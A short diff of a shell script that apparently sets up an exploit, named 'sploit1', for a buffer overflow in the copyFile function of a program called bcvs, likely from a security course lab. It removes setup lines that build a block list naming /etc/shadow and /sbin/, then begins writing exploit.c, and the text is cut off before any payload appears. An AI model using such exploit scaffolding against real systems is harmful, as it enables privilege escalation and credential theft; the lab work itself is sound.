@@ -13,22 +13,6 @@
 # overflow in the copyFile function.
 ## ----------------------------------------------------- ##
 
-# Setup necessary environment
-REPODIR=".bcvs"
-BLOCKLIST="block.list"
-BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
-
-mkdir -p sploit1_dir
-cd sploit1_dir
-mkdir -p .bcvs
-touch .bcvs/block.list
-
-#blocklist - Exact copy of the one in bcvs's directory
-echo $REPODIR > $BLOCKLISTPATH
-echo "/etc/" >> $BLOCKLISTPATH
-echo "/etc/shadow" >> $BLOCKLISTPATH
-echo "/sbin/" >> $BLOCKLISTPATH
-
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
 #include <stdio.h>
